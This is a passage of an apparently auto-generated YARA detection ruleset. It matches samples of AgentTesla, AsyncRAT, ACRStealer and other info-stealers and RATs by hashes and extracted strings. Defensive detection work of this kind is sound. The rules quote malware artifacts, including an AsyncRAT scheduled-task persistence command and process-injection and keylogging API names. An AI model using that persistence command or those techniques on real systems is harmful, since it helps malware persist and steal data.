      $s15 = "ual path, set either by the AppSearch action or with the default setting obtained from the Directory table.AttributesRemote exec" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__56c2cb80 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_56c2cb80.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "56c2cb8035b5ba012899b4b1e8c72736aa3fb773d2997aa2486e4833a49a225a"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqIAkGi2itY5jpldD5Em1ApfLjt+NqsuIK5L2/QbjzJLpafau8W64tWMSaP8rQ+whb" wide /* score: '60.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s4 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s5 = "e47Rg8DRMSsjTXwtiv.zfm9KLMYPQxQcn5YJT+GSjfS5e7vgJxwMq7fu+KeoFmsVas079OkX9oc`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '27.00'*/
      $s6 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s7 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s8 = "CRYPTEDDDD.exe" fullword wide /* score: '22.00'*/
      $s9 = "e47Rg8DRMSsjTXwtiv.zfm9KLMYPQxQcn5YJT+GSjfS5e7vgJxwMq7fu+KeoFmsVas079OkX9oc`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '18.00'*/
      $s10 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s11 = "YjE2ZDQ3aW1rNnB2YWJ0Yw==" fullword wide /* base64 encoded string 'b16d47imk6pvabtc' */ /* score: '14.00'*/
      $s12 = "WnYvMkZKN2p0UHpzYkxYVg==" fullword wide /* base64 encoded string 'Zv/2FJ7jtPzsbLXV' */ /* score: '14.00'*/
      $s13 = "=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s14 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s15 = " System.Globalization.SortVersion" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9eec154c {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9eec154c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9eec154c1907653be558504f1df1ff62513377fa8e8e32be2c112d28d208fd55"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqIAkGi2itY5jpldD5Em1ApfLjt+NqsuIK5L2/QbjzJLpafau8W64tWMSaP8rQ+whb" wide /* score: '69.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s4 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s5 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s6 = "ChgHvbeorFXEGyQQqo.jj7JqDvXfaGqjoRcoQ+SiZJgYnbU2DTCp69oL+TDR7hO1lJwuf6tky6i`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '24.00'*/
      $s7 = "BLACKHAWK.dll" fullword wide /* score: '23.00'*/
      $s8 = "EEAEAA.dll" fullword wide /* score: '23.00'*/
      $s9 = "DDDD.exe" fullword wide /* score: '22.00'*/
      $s10 = "ChgHvbeorFXEGyQQqo.jj7JqDvXfaGqjoRcoQ+SiZJgYnbU2DTCp69oL+TDR7hO1lJwuf6tky6i`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '15.00'*/
      $s11 = "processAttributes" fullword ascii /* score: '15.00'*/
      $s12 = "WnYvMkZKN2" fullword wide /* base64 encoded string 'Zv/2FJ7' */ /* score: '15.00'*/
      $s13 = "ReadProcessMemory" fullword wide /* score: '15.00'*/
      $s14 = "WriteProcessMemory" fullword wide /* score: '15.00'*/
      $s15 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule ACRStealer_signature__f26ab334be3924844f455bfd1567b2f2_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_f26ab334be3924844f455bfd1567b2f2(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4644fa6550b51f637c8f36400a3f81e5c80dc59eee26b65a872000e85ad1f0d9"
   strings:
      $x1 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><d" ascii /* score: '45.00'*/
      $x2 = " unzip 1.01 Copyright 1998-2004 Gilles Vollant - http://www.winimage.com/zLibDll" fullword ascii /* score: '32.00'*/
      $x3 = " zip 1.01 Copyright 1998-2004 Gilles Vollant - http://www.winimage.com/zLibDll" fullword ascii /* score: '32.00'*/
      $s4 = "ncy><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processor" ascii /* score: '26.00'*/
      $s5 = "=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"fal" ascii /* score: '26.00'*/
      $s6 = "C:\\Projects\\Version 18\\Binary\\ReleaseWin32\\zcl.pdb" fullword ascii /* score: '25.00'*/
      $s7 = "nvcuda.dll" fullword wide /* score: '23.00'*/
      $s8 = "/requestedExecutionLevel></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '22.00'*/
      $s9 = "zcl.dll" fullword ascii /* score: '20.00'*/
      $s10 = "?zclNlmProcessT_16u_32f@@YGJPAX0HH0HH0HH0HH0HHUGpcRoi@@HHH0G@Z" fullword ascii /* score: '15.00'*/
      $s11 = "nlmProcess_8u_32f" fullword ascii /* score: '15.00'*/
      $s12 = "?zclNlmProcess_16u_32f@@YGJPAX0HH0HH0HH0HH0HHUGpcRoi@@HHH0G@Z" fullword ascii /* score: '15.00'*/
      $s13 = "?zclNlmProcess_8u_32f@@YGJPAX0HH0HH0HH0HH0HHUGpcRoi@@HHH0G@Z" fullword ascii /* score: '15.00'*/
      $s14 = "?zclNlmProcess2T_8u_32f@@YGJPAX0HH0HH0HH0HH0HHUGpcRoi@@HHH0G@Z" fullword ascii /* score: '15.00'*/
      $s15 = "nlmProcess2_8u_32f" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__87825c52 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_87825c52.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87825c52c85fda4505fc0b0bbd833355c274a416f4238e0c2289d92f5c30a942"
   strings:
      $s1 = "Eajtfrsns.exe" fullword wide /* score: '22.00'*/
      $s2 = "ExecuteCompressor" fullword ascii /* score: '21.00'*/
      $s3 = "ExecuteReadableTask" fullword ascii /* score: '18.00'*/
      $s4 = "ExecuteParameter" fullword ascii /* score: '18.00'*/
      $s5 = "Eajtfrsns.Processing" fullword ascii /* score: '18.00'*/
      $s6 = "GEajtfrsns, Version=1.0.8409.18174, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s7 = "_SelectorExecutorElements" fullword ascii /* score: '16.00'*/
      $s8 = "previoustemplate" fullword ascii /* score: '15.00'*/
      $s9 = "ProcessOrder" fullword ascii /* score: '15.00'*/
      $s10 = "DisableProcessor" fullword ascii /* score: '15.00'*/
      $s11 = "Eajtfrsns.Compression" fullword ascii /* score: '14.00'*/
      $s12 = "GetNextOperationalArgument" fullword ascii /* score: '14.00'*/
      $s13 = "GetNextGroupedService" fullword ascii /* score: '12.00'*/
      $s14 = "GetNextControllableConnection" fullword ascii /* score: '12.00'*/
      $s15 = "GetNextFilteredTokenizer" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__95f9146e {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_95f9146e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "95f9146e4cdf8d6870988ffcdd102983ce4d3d61b34119e35bda93a4a5d1ce8d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "Wradttwszoj.exe" fullword wide /* score: '22.00'*/
      $s3 = "IWradttwszoj, Version=1.0.3809.24299, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "ejYDzcNoBx0V38pgSjsZ1sgraDwD3MtnRTZL/sNxbCEEy99EWjwV1MRpUHQX3NJabzoc1ehkRCpL1tZaYCEVyNNkRSYEwJ1iTDsv9cNrTjsYguFgXRsJycNDWyAd8cdr" wide /* score: '11.00'*/
      $s5 = "appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={CD3C7EDE-16BD-453E-CB46-FD11F0E9FF3C}&lang=en&browser=4&usagestats=1&appname" ascii /* score: '9.00'*/
      $s6 = "appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={CD3C7EDE-16BD-453E-CB46-FD11F0E9FF3C}&lang=en&browser=4&usagestats=1&appname" ascii /* score: '9.00'*/
      $s7 = "* 2Dtl" fullword ascii /* score: '9.00'*/
      $s8 = "Xfe* -" fullword ascii /* score: '9.00'*/
      $s9 = "ffefeeffea" ascii /* score: '8.00'*/
      $s10 = "ffefeeffe" ascii /* score: '8.00'*/
      $s11 = "affeeffefe" ascii /* score: '8.00'*/
      $s12 = "ffeeffefea" ascii /* score: '8.00'*/
      $s13 = "feffeefef" ascii /* score: '8.00'*/
      $s14 = "afefefeffea" ascii /* score: '8.00'*/
      $s15 = "ffeeffefefe" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e43e38d7 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e43e38d7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e43e38d7957dc20e47f8718d04c1eca4bb649ea6a90776cfd0720f0fc3d22068"
   strings:
      $s1 = "Nwils.Execution" fullword ascii /* score: '23.00'*/
      $s2 = "Nwils.exe" fullword wide /* score: '22.00'*/
      $s3 = "ExecutePassiveStream" fullword ascii /* score: '21.00'*/
      $s4 = "_ExecutorRecommender" fullword ascii /* score: '19.00'*/
      $s5 = "ExecuteEfficientExecutor" fullword ascii /* score: '18.00'*/
      $s6 = "ExecuteFlexibleExecutor" fullword ascii /* score: '18.00'*/
      $s7 = "LinkCommonProcessor" fullword ascii /* score: '18.00'*/
      $s8 = "ExecuteAdvancedExecutor" fullword ascii /* score: '18.00'*/
      $s9 = "ExecuteDictionary" fullword ascii /* score: '18.00'*/
      $s10 = "EncryptExecutor" fullword ascii /* score: '16.00'*/
      $s11 = "VisitExecutor" fullword ascii /* score: '16.00'*/
      $s12 = "BNwils, Version=1.0.580.23610, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s13 = "ExternalExecutor" fullword ascii /* score: '16.00'*/
      $s14 = "StopCustomizableExecutor" fullword ascii /* score: '16.00'*/
      $s15 = "VisibleExecutor" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fd2df842 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fd2df842.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fd2df8427dad388e333faab934e33dc78aa66a93d8ac865f5b2cfc8a052cfaaf"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "Rolyunx.exe" fullword wide /* score: '22.00'*/
      $s3 = "ERolyunx, Version=1.0.2781.25082, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "zOB4Z4bxsctudY/5/O1ifI2y3up4do7+8+AwVIbo2vd/YZrd7OpufoHw5qJsdpfD2exnf6398vwwfJPD1vduYpb98/B/atj7+u1UX4by+O1jKKT5681yY4ba7fZmW4Ly" wide /* score: '11.00'*/
      $s5 = "appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={CD3C7EDE-16BD-453E-CB46-FD11F0E9FF3C}&lang=en&browser=4&usagestats=1&appname" ascii /* score: '9.00'*/
      $s6 = "appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={CD3C7EDE-16BD-453E-CB46-FD11F0E9FF3C}&lang=en&browser=4&usagestats=1&appname" ascii /* score: '9.00'*/
      $s7 = " - hV," fullword ascii /* score: '9.00'*/
      $s8 = "5C%\\\\4d" fullword ascii /* score: '9.00'*/ /* hex encoded string '\M' */
      $s9 = "ffefefeeffe" ascii /* score: '8.00'*/
      $s10 = "feffeefef" ascii /* score: '8.00'*/
      $s11 = "afefefeffea" ascii /* score: '8.00'*/
      $s12 = "fefeffefeef" ascii /* score: '8.00'*/
      $s13 = "fefeffeeffe" ascii /* score: '8.00'*/
      $s14 = "ffefeeffefea" ascii /* score: '8.00'*/
      $s15 = "ffefeeffeef" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule ACRStealer_signature__4c6e15bf83923308fd98dabbd3bb5897_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_4c6e15bf83923308fd98dabbd3bb5897(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "da42ac39e9e87188806a0d531f43521f743e0491e21b51efbf222c26a8ef879a"
   strings:
      $s1 = "C:\\agent\\_work\\2\\s\\SonicStage\\Solution\\Bin\\Release\\SsCustom.pdb" fullword ascii /* score: '30.00'*/
      $s2 = "SsCustom.dll" fullword wide /* score: '23.00'*/
      $s3 = "SonicStage.exe" fullword wide /* score: '22.00'*/
      $s4 = "SsBackup.exe" fullword wide /* score: '22.00'*/
      $s5 = "LPStation.exe" fullword wide /* score: '22.00'*/
      $s6 = "LPLauncher.exe" fullword wide /* score: '22.00'*/
      $s7 = "LPStreaming.exe" fullword wide /* score: '22.00'*/
      $s8 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s9 = "https://www.sony.net/SonyInfo/Support/" fullword wide /* score: '13.00'*/
      $s10 = "GetCustomRoot" fullword ascii /* score: '12.00'*/
      $s11 = "Clolwoompraik.lpb" fullword ascii /* score: '10.00'*/
      $s12 = "http://www.sony.net/smc4pc/" fullword wide /* score: '10.00'*/
      $s13 = "http://www.sony.co.jp/walkman-support/" fullword wide /* score: '10.00'*/
      $s14 = "http://www.sony.net/smc4pc-eula/" fullword wide /* score: '10.00'*/
      $s15 = "MusicCenter.wav" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule a99c8140b955e68a6f4e6b4c3fc8a6c6_imphash_ {
   meta:
      description = "_subset_batch - file a99c8140b955e68a6f4e6b4c3fc8a6c6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d85980b87f1018f1e88f393c08c5828cbbc6ec8c13b1f36dfa854a0edafb9edf"
   strings:
      $s1 = "rTLgETvERSION" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      all of them
}

rule AtlasAgent_signature__9f7e1437ca8c1aa2c215f2f64da7e4b1_imphash_ {
   meta:
      description = "_subset_batch - file AtlasAgent(signature)_9f7e1437ca8c1aa2c215f2f64da7e4b1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eb96ca17a4a1c2aa97dd6fb686a40cb226c49c8abec01190f1af75080a9aaa6b"
   strings:
      $s1 = "vHbXUhtxz.exe" fullword wide /* score: '22.00'*/
      $s2 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "GetKeyState" fullword wide /* score: '12.00'*/
      $s4 = "GetAsyncKeyState" fullword wide /* score: '12.00'*/
      $s5 = "Export Component" fullword wide /* score: '12.00'*/
      $s6 = "EVFVh.pSR" fullword ascii /* score: '10.00'*/
      $s7 = "Download Workspace" fullword wide /* score: '10.00'*/
      $s8 = "C%v:\"u" fullword ascii /* score: '9.50'*/
      $s9 = "* %E54j" fullword ascii /* score: '9.00'*/
      $s10 = "IIDlLR~1?mL1" fullword ascii /* score: '9.00'*/
      $s11 = "S% PDlL!6Ub" fullword ascii /* score: '9.00'*/
      $s12 = "@\"7; +'5" fullword ascii /* score: '9.00'*/ /* hex encoded string 'u' */
      $s13 = "PostMessageW" fullword wide /* score: '9.00'*/
      $s14 = " 2025 Comprehensive Feedback Ltd." fullword wide /* score: '9.00'*/
      $s15 = "Attach Component" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__21cbafda {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_21cbafda.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "21cbafdad1d905516db91d5ea45b284e4167bdfb801701a95455ffa754b01dc9"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADx&y" fullword ascii /* score: '27.00'*/
      $s2 = "fsC.exe" fullword wide /* score: '19.00'*/
      $s3 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s4 = "\\getfunky.wav" fullword wide /* score: '13.00'*/
      $s5 = "fsC.pdb" fullword ascii /* score: '11.00'*/
      $s6 = "sunflower.jpg" fullword wide /* score: '10.00'*/
      $s7 = "flower.jpg" fullword wide /* score: '10.00'*/
      $s8 = "zEYEzDdw" fullword ascii /* score: '9.00'*/
      $s9 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s10 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s11 = "8kmgZ* S" fullword ascii /* score: '8.00'*/
      $s12 = "bizimaraba" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0ab4bfff {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0ab4bfff.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ab4bfff60be04148fa32d2955fc9f21e04d932f6f92b43eb24b011372445c1a"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADx&y" fullword ascii /* score: '27.00'*/
      $s2 = "PAT.exe" fullword wide /* score: '19.00'*/
      $s3 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s4 = "\\getfunky.wav" fullword wide /* score: '13.00'*/
      $s5 = "PAT.pdb" fullword ascii /* score: '11.00'*/
      $s6 = "sunflower.jpg" fullword wide /* score: '10.00'*/
      $s7 = "flower.jpg" fullword wide /* score: '10.00'*/
      $s8 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s9 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s10 = "bizimaraba" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3cb3401f {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3cb3401f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3cb3401f42c9b3847e85aa6cdae6e981b576d289a21a6b7d166879e2b6ae5d6f"
   strings:
      $s1 = "WhHo.exe" fullword wide /* score: '22.00'*/
      $s2 = "CommonDialog.Form1.resources" fullword ascii /* score: '15.00'*/
      $s3 = "BatchProcessing" fullword ascii /* score: '15.00'*/
      $s4 = "WhHo.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "\\test.jpg" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c335602e {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c335602e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c335602ef52f9260cfb20828515938d3c335abce3e459464d802d4c17d2fe8d7"
   strings:
      $s1 = "wpxe.exe" fullword wide /* score: '22.00'*/
      $s2 = "CommonDialog.Form1.resources" fullword ascii /* score: '15.00'*/
      $s3 = "BatchProcessing" fullword ascii /* score: '15.00'*/
      $s4 = "wpxe.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "\\test.jpg" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__413f7d00 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_413f7d00.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "413f7d00e03f5dd9362c7d2c8e5ee71de5379343db934bc87a4dd15e251b488c"
   strings:
      $s1 = "jArk.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://www.lipsum.com/" fullword wide /* score: '17.00'*/
      $s3 = "tempora" fullword wide /* score: '15.00'*/
      $s4 = "jArk.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "quaerat" fullword wide /* score: '13.00'*/
      $s6 = "commodo" fullword wide /* score: '11.00'*/
      $s7 = "deserunt" fullword wide /* score: '11.00'*/
      $s8 = "commodi" fullword wide /* score: '11.00'*/
      $s9 = "\"Paragraph Number\",\"Content\",\"Word Count\"" fullword wide /* score: '11.00'*/
      $s10 = "ContentFormatter" fullword ascii /* score: '9.00'*/
      $s11 = "contentFormatter" fullword ascii /* score: '9.00'*/
      $s12 = "consectetur" fullword wide /* score: '8.00'*/
      $s13 = "adipiscing" fullword wide /* score: '8.00'*/
      $s14 = "eiusmod" fullword wide /* score: '8.00'*/
      $s15 = "incididunt" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "31272d39a7b6d27d5e880de9169ddf5b12e4351f61ed3ab9150464637e1506ad"
   strings:
      $s1 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s2 = "22Client.exe" fullword ascii /* score: '22.00'*/
      $s3 = "Stub.exe" fullword wide /* score: '22.00'*/
      $s4 = "Windows Audio.exe" fullword wide /* score: '19.00'*/
      $s5 = "CloseMutex" fullword ascii /* score: '15.00'*/
      $s6 = "MutexControl" fullword ascii /* score: '15.00'*/
      $s7 = "b0ZRMTJlNWdHdmN6Z0ZsS0hYTGcydzJSb2RibXhRbXg=" fullword wide /* base64 encoded string 'oFQ12e5gGvczgFlKHXLg2w2RodbmxQmx' */ /* score: '14.00'*/
      $s8 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s9 = "x3fHOaHN2DgGVxEV83f2OIIe9zoHDB/tydSHQde3oOsu3N+lRCtv4I1y8J6vUFooNsyjvPloalUFTjRMTNBVl0WD2e6+K+56hI3rymJhbS7GT7xxxsyb16VX4PM26S/o" wide /* score: '12.00'*/
      $s10 = "ProcessCritical" fullword ascii /* score: '11.00'*/
      $s11 = "nuEi1AHi69bPmU4smWpDerFmq203hRlLcpYHtXh3fS+NsUFkZnUgToqUBGgMoEhrTWPTit3LTPWQVUNYfAFnzDNKMrcU7j81KVspCFs7j7nQ2LsRywrVKOOHB1kOusCD" wide /* score: '11.00'*/
      $s12 = "MKK2PimroYaVdvwr5cbm8itd7HFrRvsBry+Gkvj8wNU2vzW603ovCh6/HNuNRvsUYrmNO7TZAJtus7P9QarGya+psAU/gita6Ffzkxlr3eIZgNbiRpDVYKRIRbXD/r1B" wide /* score: '11.00'*/
      $s13 = "GetAsUInt64" fullword ascii /* score: '10.00'*/
      $s14 = "_authKey" fullword ascii /* score: '10.00'*/
      $s15 = "Client.Connection" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7c8c5767 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7c8c5767.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7c8c576731dd13174bd9289726bc59c98fa0db27515da65d5f3434c5c2921d02"
   strings:
      $s1 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s2 = "Stub.exe" fullword wide /* score: '22.00'*/
      $s3 = "NDJXeVdiZkM4OGE0WjFwTHJBMGRORzFmTGlESzhaWTc=" fullword wide /* base64 encoded string '42WyWbfC88a4Z1pLrA0dNG1fLiDK8ZY7' */ /* score: '14.00'*/
      $s4 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s5 = "UWr8MUgO5+cB4w4lrU5Whhs0Z95YTWcXmAnmG8LFZyTo/EKoYUnE97jHzum85AVOnzl2lQmg2Y39YicRfjBnCGmNw7e51arVMvWG0+TGBJyiWX03LoE5a6LVU+4ZrG8u" wide /* score: '11.00'*/
      $s6 = "LxrrlPw6hoQ2YcUOx27ZDbs20WKVgxEnokIrWGlyKDO31VgG7B60UlnPP33bjpBV9FfpgxHGUPeWyTsgSXgMQBrvulTtqfd88y4O7EBhHjUqy+hxI1T5rXjBpLpijqjf" wide /* score: '10.00'*/
      $s7 = "get_AsArray" fullword ascii /* score: '9.00'*/
      $s8 = "<HeaderSize>k__BackingField" fullword ascii /* score: '9.00'*/
      $s9 = "get_AsFloat" fullword ascii /* score: '9.00'*/
      $s10 = "get_ActivatePong" fullword ascii /* score: '9.00'*/
      $s11 = "get_SendSync" fullword ascii /* score: '9.00'*/
